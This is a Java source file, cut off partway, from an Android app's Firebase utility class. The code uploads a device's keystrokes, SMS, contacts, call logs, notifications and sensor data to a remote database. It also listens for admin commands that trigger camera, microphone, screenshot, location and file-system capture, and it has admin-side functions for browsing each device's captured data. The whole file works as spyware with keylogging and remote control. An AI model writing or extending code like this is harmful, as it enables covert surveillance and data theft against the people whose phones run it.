package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getAdminSettingsUserAndroidId;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import java.util.Calendar;
import java.util.UUID;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.SpendingEntry;
import com.vikasyadavnsit.cdc.data.TodoItem;
import com.vikasyadavnsit.cdc.dialog.MessageDialog;
import com.vikasyadavnsit.cdc.enums.ApplicationInputActions;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.TriggerType;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.enums.LoggingLevel;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;

public class FirebaseUtils {

    private static Context context;
    private static String selectedUserBasePath = null;
    private static Map<String, User> userCache = null;

    public static void initialize(Context context) {
        FirebaseUtils.context = context;
    }

    public static void setSelectedUser(String androidId) {
        selectedUserBasePath = androidId != null
                ? AppConstants.FIREBASE_RTDB_BASE_PATH + androidId
                : null;
    }

    public static String getSelectedUserPath(String subPath) {
        String base = selectedUserBasePath != null ? selectedUserBasePath : getBasePath(context);
        return base + subPath;
    }

    /**
     * Wipes all data for the current user from Firebase RTDB and flatUserDetails.
     * Invokes the callback once the wipe operation is sent (best effort).
     */
    public static void fullReset(Runnable onComplete) {
        if (context == null) {
            if (onComplete != null) onComplete.run();
            return;
        }
        
        String androidId = getAndroidID(context);
        String userPath = AppConstants.FIREBASE_RTDB_BASE_PATH + androidId;
        String flatUserPath = AppConstants.FIREBASE_RTDB_FLAT_USER_PATH + androidId;

        LoggerUtils.w("FirebaseUtils", "Full Reset: Deleting all data from Firebase for " + androidId);
        
        // 1. Delete main user node
        DatabaseReference userRef = getDbRef(userPath);
        userRef.removeValue().addOnCompleteListener(task -> {
            // 2. Delete flat details entry
            getDbRef(flatUserPath).removeValue().addOnCompleteListener(task2 -> {
                LoggerUtils.i("FirebaseUtils", "Firebase wipe complete.");
                if (onComplete != null) onComplete.run();
            });
        });
    }

    /**
     * Wipes all captured device data from Firebase (SMS, Contacts, Logs, etc.)
     * This only affects /userDeviceData node and does not trigger a resync.
     */
    public static void wipeCloudData() {
        if (context == null) return;
        LoggerUtils.w("FirebaseUtils", "Wiping all user device data from cloud");
        getDbRef(getPath("/userDeviceData")).removeValue();
    }

    /**
     * Admin-side: Wipes a specific category of data for the selected user.
     */
    public static void wipeRemoteCloudData(String category) {
        LoggerUtils.w("FirebaseUtils", "Admin: Wiping remote cloud data category: " + category);
        getDbRef(getSelectedUserPath("/userDeviceData/" + category)).removeValue();
        
        // Also clear the corresponding metadata index
        if ("sms".equals(category) || "callLogs".equals(category)) {
            getDbRef(getSelectedUserPath("/userDeviceData/metadata/" + category)).removeValue();
        }
        
        // Specific cleanup for camera and screenshots to ensure all subnodes are cleared
        if ("camera".equals(category)) {
            getDbRef(getSelectedUserPath("/userDeviceData/camera")).removeValue();
        }
        if ("screenshot".equals(category)) {
            getDbRef(getSelectedUserPath("/userDeviceData/screenshot")).removeValue();
        }
        if ("fileStructure".equals(category)) {
            getDbRef(getSelectedUserPath("/userDeviceData/fileStructure")).removeValue();
        }
    }

    public static void pushRemoteLog(LoggingLevel level, String tag, String message) {
        if (context == null) return;
        String androidId = getAndroidID(context);
        
        long now = System.currentTimeMillis();
        String dateKey = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(now));
        String timeValue = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date(now));

        DatabaseReference logsRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH + androidId 
                + "/userDeviceData/remoteLogs/" + dateKey).push();
        
        Map<String, Object> logEntry = new HashMap<>();
        logEntry.put("level", level.name());
        logEntry.put("tag", tag);
        logEntry.put("message", message);
        logEntry.put("time", timeValue);
        logEntry.put("timestamp", now);
        logsRef.setValue(logEntry);
    }

    private static boolean isInitialized = false;

    public static void checkUserExistsAndInit(Activity activity) {
        DatabaseReference userRef = getDbRef(getBasePath(activity));
        // Use single value event for the initial check to prevent loops
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (activity.isFinishing()) return;
                
                if (!snapshot.hasChild("fullName")) {
                    LoggerUtils.w("FirebaseUtils", "User profile incomplete or deleted. Redirecting to setup.");
                    // Check if we already have a fullName in prefs to avoid redundant resets
                    // But if it's really missing in DB, we must reset.

                    SharedPreferenceUtils.clearUserRegistration(activity);
                    isInitialized = false; // Reset flag for re-registration

                    activity.runOnUiThread(() -> {
                        if (activity.isFinishing()) return;
                        Intent intent = new Intent(activity, com.vikasyadavnsit.cdc.activities.WelcomeActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                        activity.startActivity(intent);
                        activity.finish();
                    });
                } else {
                    initializeServices(activity);
                    
                    // After successful initial check, we can attach a persistent listener
                    // to detect remote wipes in real-time, but only for the fullName field.
                    userRef.child("fullName").addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot nameSnapshot) {
                            if (activity.isFinishing()) return;
                            
                            // Only trigger wipe if we are sure the user was deleted, 
                            // not just a temporary disconnection
                            if (!nameSnapshot.exists() && snapshot.exists()) {
                                LoggerUtils.e("FirebaseUtils", "User was deleted remotely! Resetting...");
                                SharedPreferenceUtils.clearUserRegistration(activity);
                                isInitialized = false; // Reset flag for re-registration
                                Intent intent = new Intent(activity, com.vikasyadavnsit.cdc.activities.WelcomeActivity.class);
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                                activity.startActivity(intent);
                                activity.finish();
                            }
                        }
                        @Override public void onCancelled(@NonNull DatabaseError error) {}
                    });
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "checkUserExistsAndInit failed: " + error.toException());
                getAppTriggerSettingsData();
            }
        });
    }

    public static void initializeServices(Context context) {
        if (isInitialized) {
            LoggerUtils.d("FirebaseUtils", "Services already initialized, skipping duplicate call");
            return;
        }
        isInitialized = true;
        LoggerUtils.i("FirebaseUtils", "Initializing all remote services and listeners (Context: " + context.getClass().getSimpleName() + ")");
        
        // Use application context for long-running listeners to avoid memory leaks
        Context appContext = context.getApplicationContext();
        
        getAppTriggerSettingsData();
        
        // Sync actual permission statuses
        syncAllPermissionStatuses(appContext);
        
        listenForRemoteCommands(appContext);
        listenForDownloadCommands(appContext);
        listenForLocationCommands(appContext);
        listenForAppUsageCommands(appContext);
        listenForSensorCommands(appContext);
        listenForSmsResyncCommand(appContext);
        listenForContactsResyncCommand(appContext);
        listenForScreenshotCommand(appContext);
        listenForNotificationCommand(appContext);
        listenForCameraCommands(appContext);
        listenForMicCommands(appContext);
        
        com.vikasyadavnsit.cdc.utils.CommonUtil.startCaptureService(appContext);
        com.vikasyadavnsit.cdc.services.DeltaSyncWorker.schedule(appContext);
    }

    public static void requestRemoteDirectoryScan(String path) {
        requestRemoteDirectoryScan(path, false);
    }

    public static void requestRemoteDirectoryScan(String path, boolean isFullBFS) {
        LoggerUtils.i("FirebaseUtils", "Requesting remote directory scan for path: " + (path.isEmpty() ? "Root" : path) + " (full: " + isFullBFS + ")");
        Map<String, Object> command = new HashMap<>();
        command.put("path", path);
        command.put("isFullBFS", isFullBFS);
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/directoryRequest")).setValue(command);
    }

    public static void listenForRemoteCommands(Context context) {
        getDbRef(getPath("/commands/directoryRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String path = snapshot.child("path").getValue(String.class);
                    Boolean isFullBFS = snapshot.child("isFullBFS").getValue(Boolean.class);
                    if (path != null) {
                        LoggerUtils.d("FirebaseUtils", "Received remote directory request: " + path + " (full: " + isFullBFS + ")");
                        FileExplorer.captureDirectoryStructure(context, path, isFullBFS != null && isFullBFS);
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "Error listening for remote commands: " + error.getMessage());
            }
        });
    }

    // Get a reference to the database
    public static FirebaseDatabase getDatabase() {
        return FirebaseDatabase.getInstance();
    }

    public static DatabaseReference getDbRef(String path) {
        DatabaseReference reference = getDatabase().getReference(path);
        reference.keepSynced(true);
        //reference.onDisconnect().setValue("I disconnected!");
        return reference;
    }

    public static String getPath(String path) {
        return getPath(context, path);
    }

    public static String getPath(Context context, String path) {
        return getBasePath(context) + path;
    }

    private static String getBasePath(Context context) {
        if (context == null) {
            LoggerUtils.e("FirebaseUtils", "getBasePath: context is null!");
            return AppConstants.FIREBASE_RTDB_BASE_PATH + "unknown";
        }
        return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
    }

    public static void getAppTriggerSettingsData() {
        DatabaseReference appSettingsRef = getDbRef(getPath("/appSettings"));
        appSettingsRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                } else {
                    LoggerUtils.d("FirebaseUtils", "App settings node missing - waiting for registration");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap() {
        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
        PermissionManager pm = new PermissionManager();
        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
            boolean granted = clickAction.getRequiredPermission() == null || pm.hasPermission(context, clickAction.getRequiredPermission());
            
            long defaultInterval = 0;
            if (clickAction == ClickActions.REQUEST_LOCATION_PERMISSION) {
                defaultInterval = 60000;
            }

            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder()
                    .enabled(false) 
                    .repeatable(false)
                    .maxRepetitions(1)
                    .interval(defaultInterval)
                    .actionStatus(ActionStatus.IDLE)
                    .clickActions(clickAction)
                    .uploadDataSnapshot(true)
                    .deleteLocalData(false)
                    .permissionGranted(granted)
                    .logLevels(clickAction == ClickActions.PUSH_REMOTE_LOGS ? "DEBUG,INFO,WARN,ERROR" : null)
                    .build();
            map.put(clickAction.name(), obj);
        });
        return map;
    }

    /**
     * Iterates through all ClickActions and updates their actual permission status in the Firebase trigger map.
     */
    public static void syncAllPermissionStatuses(Context context) {
        String androidId = com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID(context);
        LoggerUtils.d("FirebaseUtils", "Syncing all permission statuses to trigger map for device: " + androidId);
        DatabaseReference ref = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
        PermissionManager pm = new PermissionManager();
        
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Map<String, Object> updates = new HashMap<>();
                for (ClickActions action : ClickActions.values()) {
                    DataSnapshot actionSnap = snapshot.child(action.name());
                    if (actionSnap.exists()) {
                        boolean currentReported = Boolean.TRUE.equals(actionSnap.child("permissionGranted").getValue(Boolean.class));
                        boolean actuallyGranted = action.getRequiredPermission() == null || pm.hasPermission(context, action.getRequiredPermission());
                        
                        if (currentReported != actuallyGranted) {
                            updates.put(action.name() + "/permissionGranted", actuallyGranted);
                            LoggerUtils.d("FirebaseUtils", "Updating " + action.name() + " permissionGranted to: " + actuallyGranted);
                        }
                    }
                }
                if (!updates.isEmpty()) {
                    ref.updateChildren(updates);
                } else {
                    LoggerUtils.d("FirebaseUtils", "No permission status changes detected, skipping update.");
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }


    public static void createUser(Context context, String name) {
        LoggerUtils.i("FirebaseUtils", "Creating new user record for: " + name);
        String uuid = UUID.randomUUID().toString();
        
        User user = User.builder()
                .id(uuid)
                .fullName(name)
                .deviceDetails(getDeviceDetails(context))
                .appSettings(User.AppSettings.builder()
                        .appTriggerSettingsDataMap(createAppTriggerSettingsDataMap())
                        .build())
                .build();

        // 1. Create main user node
        getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context)).setValue(user)
                .addOnSuccessListener(aVoid -> LoggerUtils.i("FirebaseUtils", "User record created successfully in RTDB"))
                .addOnFailureListener(e -> LoggerUtils.e("FirebaseUtils", "Failed to create user record: " + e.getMessage()));
        
        // 2. Create entry in flatUserDetails for the admin dropdown
        getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH + getAndroidID(context)).setValue(user);
        
        // Sync permissions immediately after user creation
        syncAllPermissionStatuses(context);
    }

    public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
        String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault())
                .format(new java.util.Date());
        String appName = AppUtils.getAppName(context, keyStrokeData.getAppPackage());
        // Sanitize for Firebase key (disallow . # $ [ ])
        String safeName = appName.replaceAll("[.#$\\[\\]]", "-");

        String fullPath = getPath("/userDeviceData/keystrokes/" + date + "/" + safeName);
        LoggerUtils.i("FirebaseUtils", "Uploading keystroke to: " + fullPath);
        DatabaseReference ref = getDbRef(fullPath);

        // Create a map to avoid redundancy (path already contains app identity)
        Map<String, Object> data = new HashMap<>();
        data.put("text", keyStrokeData.getText());
        data.put("timestamp", keyStrokeData.getTimestamp());
        data.put("typed", keyStrokeData.isTyped());

        ref.push().setValue(data);
    }

    public static void getAndroidUserKeystrokeDates(DatesCallback callback) {
        getDbRef(getSelectedUserPath("/userDeviceData/keystrokes")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<String> dates = new ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    if (child.getKey() != null) dates.add(child.getKey());
                }
                Collections.sort(dates, Collections.reverseOrder());
                callback.onDates(dates);
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                callback.onDates(new ArrayList<>());
            }
        });
    }

    public static void getAndroidUserKeystrokeApps(String date, DatesCallback callback) {
        getDbRef(getSelectedUserPath("/userDeviceData/keystrokes/" + date)).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<String> apps = new ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    if (child.getKey() != null) apps.add(child.getKey());
                }
                Collections.sort(apps);
                callback.onDates(apps);
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                callback.onDates(new ArrayList<>());
            }
        });
    }

    public static void getAndroidUserKeystrokes(String date, String appPkg, ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/keystrokes/" + date + "/" + appPkg)).addListenerForSingleValueEvent(listener);
    }

    public static void uploadUserSmsDataSnapshot(List<Map<String, String>> messages) {
        if (messages == null || messages.isEmpty()) return;
        LoggerUtils.d("FirebaseUtils", "Uploading " + messages.size() + " SMS records (batched)");
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/sms"));
        DatabaseReference indexRef = getDbRef(getPath("/userDeviceData/metadata/sms/availableDates"));
        
        Set<String> uniqueDates = new HashSet<>();
        final int BATCH_SIZE = 100;
        for (int i = 0; i < messages.size(); i += BATCH_SIZE) {
            int end = Math.min(i + BATCH_SIZE, messages.size());
            List<Map<String, String>> batch = messages.subList(i, end);
            Map<String, Object> updates = new HashMap<>();
            for (Map<String, String> message : batch) {
                String dateStr = getDateString(message.get("date"));
                uniqueDates.add(dateStr);
                String id = message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING);
                if (id != null) {
                    updates.put(dateStr + "/" + id, message);
                }
            }
            ref.updateChildren(updates);
        }

        if (!uniqueDates.isEmpty()) {
            Map<String, Object> indexUpdates = new HashMap<>();
            for (String date : uniqueDates) indexUpdates.put(date, true);
            indexRef.updateChildren(indexUpdates);
        }
    }

    public static void uploadUserContactsDataSnapshot(List<Map<String, String>> messages) {
        if (messages == null || messages.isEmpty()) return;
        LoggerUtils.d("FirebaseUtils", "Uploading " + messages.size() + " Contacts (batched)");
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/contacts"));
        
        final int BATCH_SIZE = 100;
        for (int i = 0; i < messages.size(); i += BATCH_SIZE) {
            int end = Math.min(i + BATCH_SIZE, messages.size());
            List<Map<String, String>> batch = messages.subList(i, end);
            Map<String, Object> updates = new HashMap<>();
            for (Map<String, String> message : batch) {
                String name = message.get("name");
                String initial = (name != null && !name.isEmpty()) 
                        ? name.substring(0, 1).toUpperCase(java.util.Locale.getDefault()) 
                        : "#";
                // Check if initial is a letter, otherwise use #
                if (!Character.isLetter(initial.charAt(0))) initial = "#";
                
                String id = message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING);
                if (id != null) {
                    updates.put(initial + "/" + id, message);
                }
            }
            ref.updateChildren(updates);
        }
    }

    public static void uploadUserCallLogsDataSnapshot(List<Map<String, String>> messages) {
        if (messages == null || messages.isEmpty()) return;
        LoggerUtils.d("FirebaseUtils", "Uploading " + messages.size() + " Call Logs (batched)");
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/callLogs"));
        DatabaseReference indexRef = getDbRef(getPath("/userDeviceData/metadata/callLogs/availableDates"));
        
        Set<String> uniqueDates = new HashSet<>();
        final int BATCH_SIZE = 100;
        for (int i = 0; i < messages.size(); i += BATCH_SIZE) {
            int end = Math.min(i + BATCH_SIZE, messages.size());
            List<Map<String, String>> batch = messages.subList(i, end);
            Map<String, Object> updates = new HashMap<>();
            for (Map<String, String> message : batch) {
                String dateStr = getDateString(message.get("date"));
                uniqueDates.add(dateStr);
                String id = message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING);
                if (id != null) {
                    updates.put(dateStr + "/" + id, message);
                }
            }
            ref.updateChildren(updates);
        }

        if (!uniqueDates.isEmpty()) {
            Map<String, Object> indexUpdates = new HashMap<>();
            for (String date : uniqueDates) indexUpdates.put(date, true);
            indexRef.updateChildren(indexUpdates);
        }
    }

    private static String getDateString(String timestamp) {
        if (timestamp == null || timestamp.isEmpty()) return "unknown";
        try {
            long time = Long.parseLong(timestamp);
            return new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault()).format(new java.util.Date(time));
        } catch (Exception e) {
            return "unknown";
        }
    }

    public static void uploadUserNotificationDataSnapshot(NotificationData notificationData) {
        String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault())
                .format(new java.util.Date());
        String pkg = notificationData.getPackageName();
        if (pkg == null) pkg = "unknown";
        String safePkg = sanitizeFirebaseKey(pkg);
        
        LoggerUtils.d("FirebaseUtils", "Uploading notification snapshot from " + pkg);
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/notifications/" + date + "/" + safePkg));
        ref.push().setValue(notificationData);
    }

    public static void uploadSensorDataSnapshot(Map<String, Object> sensorData) {
        if (sensorData == null || sensorData.isEmpty()) return;
        getDbRef(getPath("/userDeviceData/sensors")).setValue(sensorData);
    }

    public static void uploadSensorHistory(List<Map<String, Object>> history) {
        if (history == null || history.isEmpty()) return;
        getDbRef(getPath("/userDeviceData/sensorHistory")).setValue(history);
    }

    public static void monitorRemoteSensorHistory(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/sensorHistory")).addValueEventListener(listener);
    }

    public static void removeSensorHistoryListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/sensorHistory")).removeEventListener(listener);
    }

    public static void getAndroidUserClickActions() {
        monitorAndroidUserClickActions(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
                } else {
                    ActionUtils.getAndUpdateAndroidUserClickActions(null);
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private static ValueEventListener clickActionsListener;
    public static void monitorAndroidUserClickActions(ValueEventListener listener) {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/appSettings"));
        if (clickActionsListener != null) {
            ref.removeEventListener(clickActionsListener);
        }
        clickActionsListener = listener;
        ref.addValueEventListener(listener);
    }

    public static void stopMonitoringClickActions() {
        if (clickActionsListener != null) {
            String path = getSelectedUserPath("/appSettings");
            if (path != null) {
                getDbRef(path).removeEventListener(clickActionsListener);
            }
            clickActionsListener = null;
        }
    }

    public static void getFlatUserDetails() {
        getFlatUserDetails(false);
    }

    public static void getFlatUserDetails(boolean forceRefresh) {
        if (!forceRefresh && userCache != null) {
            ActionUtils.performFlatUserDetailsActions(userCache);
            return;
        }

        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH);
        ref.addListenerForSingleValueEvent(new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    Object value = dataSnapshot.getValue(Object.class);
                    userCache = ActionUtils.parseFlatUserDetails(value);
                    ActionUtils.performFlatUserDetailsActions(userCache);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserKeystrokes() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/keystrokes"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserKeystrokes(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserAccessibilityNotification() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/notifications"));
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    ActionUtils.displayAndroidUserAccessibilityNotification(snapshot.getValue(Object.class));
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getAndroidUserSystemAppUsageStatistics() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/appStats"));
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displaySystemAppUsageStatisticsReportData(dataSnapshot.getValue(Object.class));
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getRemoteSms() {
        getAvailableSmsDates(dates -> {
            if (!dates.isEmpty()) {
                getRemoteSms(dates.get(0));
            } else {
                getRemoteSms((String) null);
            }
        });
    }

    public static void getRemoteSms(String date) {
        String subPath = "/userDeviceData/sms";
        if (date != null && !date.isEmpty()) subPath += "/" + date;
        getDbRef(getSelectedUserPath(subPath)).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteSms(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getRemoteCallLogs() {
        getAvailableCallLogDates(dates -> {
            if (!dates.isEmpty()) {
                getRemoteCallLogs(dates.get(0));
            } else {
                getRemoteCallLogs((String) null);
            }
        });
    }


    public static void getRemoteCallLogs(String date) {
        String subPath = "/userDeviceData/callLogs";
        if (date != null && !date.isEmpty()) subPath += "/" + date;
        getDbRef(getSelectedUserPath(subPath)).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteCallLogs(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public interface DatesCallback {
        void onDates(List<String> dates);
    }

    public static void getAvailableSmsDates(DatesCallback callback) {
        getDbRef(getSelectedUserPath("/userDeviceData/metadata/sms/availableDates")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    List<String> dates = new ArrayList<>();
                    for (DataSnapshot child : snapshot.getChildren()) {
                        String key = child.getKey();
                        if (key != null) dates.add(key);
                    }
                    Collections.sort(dates, Collections.reverseOrder());
                    callback.onDates(dates);
                } else {
                    // Fallback to legacy structure if metadata doesn't exist yet
                    getDbRef(getSelectedUserPath("/userDeviceData/sms")).addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            List<String> dates = new ArrayList<>();
                            for (DataSnapshot child : snapshot.getChildren()) {
                                String key = child.getKey();
                                if (key != null) dates.add(key);
                            }
                            Collections.sort(dates, Collections.reverseOrder());
                            callback.onDates(dates);
                        }
                        @Override public void onCancelled(@NonNull DatabaseError error) {
                            callback.onDates(new ArrayList<>());
                        }
                    });
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                callback.onDates(new ArrayList<>());
            }
        });
    }

    public static void getAvailableCallLogDates(DatesCallback callback) {
        getDbRef(getSelectedUserPath("/userDeviceData/metadata/callLogs/availableDates")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    List<String> dates = new ArrayList<>();
                    for (DataSnapshot child : snapshot.getChildren()) {
                        String key = child.getKey();
                        if (key != null) dates.add(key);
                    }
                    Collections.sort(dates, Collections.reverseOrder());
                    callback.onDates(dates);
                } else {
                    // Fallback to legacy structure if metadata doesn't exist yet
                    getDbRef(getSelectedUserPath("/userDeviceData/callLogs")).addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            List<String> dates = new ArrayList<>();
                            for (DataSnapshot child : snapshot.getChildren()) {
                                String key = child.getKey();
                                if (key != null) dates.add(key);
                            }
                            Collections.sort(dates, Collections.reverseOrder());
                            callback.onDates(dates);
                        }
                        @Override public void onCancelled(@NonNull DatabaseError error) {
                            callback.onDates(new ArrayList<>());
                        }
                    });
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                callback.onDates(new ArrayList<>());
            }
        });
    }

    public static void getRemoteSms(List<String> dates) {
        if (dates == null || dates.isEmpty()) {
            getRemoteSms((String) null);
            return;
        }
        Map<String, Object> merged = new HashMap<>();
        int[] remaining = {dates.size()};
        for (String date : dates) {
            getDbRef(getSelectedUserPath("/userDeviceData/sms/" + date)).addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    if (snapshot.exists() && snapshot.getValue() instanceof Map) {
                        @SuppressWarnings("unchecked")
                        Map<String, Object> dateData = (Map<String, Object>) snapshot.getValue();
                        merged.putAll(dateData);
                    }
                    if (--remaining[0] == 0) {
                        ActionUtils.displayRemoteSms(merged.isEmpty() ? null : merged);
                    }
                }
                @Override public void onCancelled(@NonNull DatabaseError error) {
                    if (--remaining[0] == 0) {
                        ActionUtils.displayRemoteSms(merged.isEmpty() ? null : merged);
                    }
                }
            });
        }
    }

    public static void getRemoteCallLogs(List<String> dates) {
        if (dates == null || dates.isEmpty()) {
            getRemoteCallLogs((String) null);
            return;
        }
        Map<String, Object> merged = new HashMap<>();
        int[] remaining = {dates.size()};
        for (String date : dates) {
            getDbRef(getSelectedUserPath("/userDeviceData/callLogs/" + date)).addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    if (snapshot.exists() && snapshot.getValue() instanceof Map) {
                        @SuppressWarnings("unchecked")
                        Map<String, Object> dateData = (Map<String, Object>) snapshot.getValue();
                        merged.putAll(dateData);
                    }
                    if (--remaining[0] == 0) {
                        ActionUtils.displayRemoteCallLogs(merged.isEmpty() ? null : merged);
                    }
                }
                @Override public void onCancelled(@NonNull DatabaseError error) {
                    if (--remaining[0] == 0) {
                        ActionUtils.displayRemoteCallLogs(merged.isEmpty() ? null : merged);
                    }
                }
            });
        }
    }

    public static void getRemoteContacts() {
